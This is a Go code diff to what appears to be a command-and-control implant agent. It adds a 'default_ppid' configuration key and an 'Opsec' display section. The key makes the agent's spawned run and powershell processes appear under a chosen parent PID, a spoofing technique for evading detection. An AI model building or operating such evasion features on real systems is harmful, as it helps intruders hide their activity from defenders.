@@ -96,6 +96,15 @@ func configShow(agent *structs.Agent) structs.CommandResult {
 
 	sb.WriteString("Working Hours\n")
 	sb.WriteString("-------------\n")
+	sb.WriteString("Opsec\n")
+	sb.WriteString("-----\n")
+	if agent.DefaultPPID > 0 {
+		sb.WriteString(fmt.Sprintf("  %-22s %d\n", "Default PPID:", agent.DefaultPPID))
+	} else {
+		sb.WriteString(fmt.Sprintf("  %-22s disabled\n", "Default PPID:"))
+	}
+	sb.WriteString("\n")
+
 	if agent.WorkingHoursEnabled() {
 		sb.WriteString(fmt.Sprintf("  %-22s %s\n", "Start:", structs.FormatWorkingHoursTime(agent.WorkingHoursStart)))
 		sb.WriteString(fmt.Sprintf("  %-22s %s\n", "End:", structs.FormatWorkingHoursTime(agent.WorkingHoursEnd)))
@@ -134,7 +143,7 @@ func configSet(agent *structs.Agent, key, value string) structs.CommandResult {
 
 	if key == "" {
 		return structs.CommandResult{
-			Output:    "Error: key is required. Settable keys: sleep, jitter, killdate, working_hours_start, working_hours_end, working_days",
+			Output:    "Error: key is required. Settable keys: sleep, jitter, killdate, working_hours_start, working_hours_end, working_days, default_ppid",
 			Status:    "error",
 			Completed: true,
 		}
@@ -292,9 +301,51 @@ func configSet(agent *structs.Agent, key, value string) structs.CommandResult {
 			Completed: true,
 		}
 
+	case "default_ppid", "ppid":
+		if value == "" || value == "0" || value == "disable" || value == "off" {
+			old := agent.DefaultPPID
+			agent.DefaultPPID = 0
+			SetDefaultPPID(0)
+			if old > 0 {
+				return structs.CommandResult{
+					Output:    fmt.Sprintf("[+] Default PPID disabled (was %d)", old),
+					Status:    "success",
+					Completed: true,
+				}
+			}
+			return structs.CommandResult{
+				Output:    "[+] Default PPID disabled",
+				Status:    "success",
+				Completed: true,
+			}
+		}
+		n, err := strconv.Atoi(value)
+		if err != nil || n < 0 {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error: invalid PPID value '%s' (must be non-negative integer)", value),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		old := agent.DefaultPPID
+		agent.DefaultPPID = n
+		SetDefaultPPID(n)
+		if old > 0 {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("[+] Default PPID changed: %d → %d (run/powershell child processes will appear under PID %d)", old, n, n),
+				Status:    "success",
+				Completed: true,
+			}
+		}
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("[+] Default PPID set: %d (run/powershell child processes will appear under PID %d)", n, n),
+			Status:    "success",
+			Completed: true,
+		}
+
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown config key '%s'. Settable keys: sleep, jitter, killdate, working_hours_start (wh_start), working_hours_end (wh_end), working_days (wh_days)", key),
+			Output:    fmt.Sprintf("Error: unknown config key '%s'. Settable keys: sleep, jitter, killdate, working_hours_start (wh_start), working_hours_end (wh_end), working_days (wh_days), default_ppid (ppid)", key),
 			Status:    "error",
 			Completed: true,
 		}
